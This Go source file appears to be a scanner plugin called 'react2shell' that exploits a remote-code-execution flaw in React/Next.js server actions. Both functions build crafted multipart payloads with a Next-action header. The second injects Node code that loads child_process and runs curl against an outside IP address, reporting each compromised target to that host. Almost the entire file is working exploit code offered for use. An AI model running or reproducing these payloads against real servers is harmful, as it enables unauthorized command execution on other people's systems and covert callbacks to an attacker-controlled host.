package mypocs

import (
	"bytes"
	"fmt"
	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type react2shell struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("react2shell", &react2shell{})
}

func (d *react2shell) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "react2shell",
		Remarks: "react2shell",
		Level:   0,
		Type:    "RCE",
		Author:  "Deen",
		References: plugin.References{
			URL:  "",
			CVE:  "",
			KPID: "KP-1008",
		},
	}
	return d.info
}

func (d *react2shell) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *react2shell) Check(URL string, meta plugin.TaskMeta) bool {
	if scanRCE(URL) {
		return true
	}
	scanSSRFpoc(URL)
	return false
}

func scanRCE(target string) (flag bool) {
	method := "POST"

	// 1. 定义 Boundary (必须与 Content-Type 中的一致)
	boundary := "e0b0955de0b0955de0b0955de0b0955d"

	// 2. 手动构建 Body
	// 使用 bytes.Buffer 拼接，以确保不改变原始 Payload 中的转义字符
	payload := new(bytes.Buffer)

	// --- 第一个部分: name="0" ---
	payload.WriteString("--" + boundary + "\r\n")
	payload.WriteString("Content-Disposition: form-data; name=\"0\"\r\n")
	payload.WriteString("\r\n")
	// 注意：这里使用反引号 ` ` (Raw String) 来包含原始 JSON 字符串，防止 Go 解析其中的反斜杠
	payload.WriteString(`{"then": "$2", "status": "resolved_model", "reason": -1, "value": "{\"then\": \"$B0\"}", "_response": {"_prefix": "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/login?a=hacked;307;'});", "_formData": {"get": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"}}}`)
	payload.WriteString("\r\n")

	// --- 第二个部分: name="1" ---
	payload.WriteString("--" + boundary + "\r\n")
	payload.WriteString("Content-Disposition: form-data; name=\"1\"\r\n")
	payload.WriteString("\r\n")
	payload.WriteString(`"$\u00400"`)
	payload.WriteString("\r\n")
	payload.WriteString("--" + boundary + "\r\n")

	payload.WriteString("Content-Disposition: form-data; name=\"2\"\r\n")
	payload.WriteString("\r\n")
	payload.WriteString(`"$1:\u005F\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:then"`)
	payload.WriteString("\r\n")

	// --- 结束 Boundary ---
	payload.WriteString("--" + boundary + "--\r\n")

	proxyStr := "http://127.0.0.1:8081"
	// 例如: "http://127.0.0.1:8080" 或 "http://user:pass@192.168.1.100:8888"

	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		fmt.Println("解析代理URL失败:", err)
		return
	}

	// 2. 创建自定义的 Transport
	transport := &http.Transport{
		// 配置 Proxy 字段
		Proxy: http.ProxyURL(proxyURL),
		// 可以在这里配置其他 Transport 选项，例如 SSL 跳过验证 InsecureSkipVerify: true
	}
	_ = transport
	// 3. 创建请求
	client := &http.Client{
		//Transport: transport,
		Timeout: 5 * time.Second,
	}
	req, err := http.NewRequest(method, target, payload)

	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}

	// 4. 设置 Headers
	req.Header.Set("User-Agent", " Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Next-action", "\\tx") // 这里发送字面量 "\tx"

	// 关键：手动设置 Content-Type 以包含 Boundary
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	// Content-Length 会由 Go 的 net/http 自动计算并添加

	// 5. 发送请求
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("发送请求失败:", err)
		return
	}
	defer res.Body.Close()

	// 6. 读取响应
	body, err := io.ReadAll(res.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}

	redirect := res.Header.Get("x-action-redirect")
	if strings.Contains(redirect, "hacked") {
		return true
	}

	fmt.Println("响应状态码:", res.StatusCode)
	fmt.Println("响应内容:", string(body))
	return false
}

func scanSSRFpoc(target string) {
	method := "POST"

	// 1. 定义 Boundary (必须与 Content-Type 中的一致)
	boundary := "e0b0955de0b0955de0b0955de0b0955d"

	// 2. 手动构建 Body
	// 使用 bytes.Buffer 拼接，以确保不改变原始 Payload 中的转义字符
	payload := new(bytes.Buffer)

	// --- 第一个部分: name="0" ---
	payload.WriteString("--" + boundary + "\r\n")
	payload.WriteString("Content-Disposition: form-data; name=\"0\"\r\n")
	payload.WriteString("\r\n")
	// 注意：这里使用反引号 ` ` (Raw String) 来包含原始 JSON 字符串，防止 Go 解析其中的反斜杠
	payload.WriteString(`{"then": "$2", "status": "resolved_model", "reason": -1, "value": "{\"then\": \"$B0\"}", "_response": {"_prefix": "a=process;b=a['mainModule'];c=atob('Y2hpbGRfcHJvY2Vzcw==');d=b.require(c);e=d.exec;f='curl';e(f+' http://8.134.216.109:5000/api/domain?domain=` + target + `');", "_formData": {"get": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"}}}`)
	payload.WriteString("\r\n")

	// --- 第二个部分: name="1" ---
	payload.WriteString("--" + boundary + "\r\n")
	payload.WriteString("Content-Disposition: form-data; name=\"1\"\r\n")
	payload.WriteString("\r\n")
	payload.WriteString(`"$\u00400"`)
	payload.WriteString("\r\n")
	payload.WriteString("--" + boundary + "\r\n")

	payload.WriteString("Content-Disposition: form-data; name=\"2\"\r\n")
	payload.WriteString("\r\n")
	payload.WriteString(`"$1:\u005F\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:then"`)
	payload.WriteString("\r\n")

	// --- 结束 Boundary ---
	payload.WriteString("--" + boundary + "--\r\n")

	proxyStr := "http://127.0.0.1:8081"
	// 例如: "http://127.0.0.1:8080" 或 "http://user:pass@192.168.1.100:8888"

	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		fmt.Println("解析代理URL失败:", err)
		return
	}

	// 2. 创建自定义的 Transport
	transport := &http.Transport{
		// 配置 Proxy 字段
		Proxy: http.ProxyURL(proxyURL),
		// 可以在这里配置其他 Transport 选项，例如 SSL 跳过验证 InsecureSkipVerify: true
	}
	_ = transport

	// 3. 创建请求
	client := &http.Client{
		//Transport: transport,
		Timeout: 2 * time.Second,
	}
	req, err := http.NewRequest(method, target, payload)

	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}

	// 4. 设置 Headers
	req.Header.Set("User-Agent", " Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Next-action", "\\tx") // 这里发送字面量 "\tx"

	// 关键：手动设置 Content-Type 以包含 Boundary
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	// Content-Length 会由 Go 的 net/http 自动计算并添加

	// 5. 发送请求
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("发送请求失败:", err)
		return
	}
	defer res.Body.Close()

	// 6. 读取响应
	body, err := io.ReadAll(res.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}

	fmt.Println("响应状态码:", res.StatusCode)
	fmt.Println("响应内容:", string(body))
}
